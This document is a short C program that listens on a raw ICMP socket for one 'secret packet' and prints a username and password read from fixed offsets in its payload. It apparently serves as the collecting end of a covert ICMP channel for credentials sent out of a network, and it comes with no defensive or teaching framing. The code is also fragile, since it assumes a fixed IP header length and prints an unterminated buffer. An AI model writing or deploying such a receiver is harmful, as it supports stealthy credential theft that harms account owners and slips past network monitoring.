#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

int main(int argc, char * argv[]){
	
	unsigned char recvbuff[256];
	struct ip * iphead;
	int icmp_sock = 0;
	struct sockaddr_in src;
	socklen_t src_addr_size = sizeof(struct sockaddr_in);
	struct icmp * icmphead;
	
	if((icmp_sock = socket(PF_INET,SOCK_RAW,IPPROTO_ICMP)) < 0){
		printf("Could't OPEN Socket.\n");
		exit(1);
	}

	printf("Waiting for username and password...\n");
	if(recvfrom(icmp_sock,recvbuff,256,0,(struct sockaddr *)&src,&src_addr_size) < 0 ){
		printf("Failed to getting the secret packet!\n");
		close(icmp_sock);
		exit(1);
	}
	
	iphead = (struct ip *)recvbuff;
	icmphead = (struct icmp * )(recvbuff + sizeof(struct ip));
	
	printf("Username:  %s\n",(char *)((char *)icmphead+8));
	printf("Password:  %s\n",(char *)((char *)icmphead+20));


}
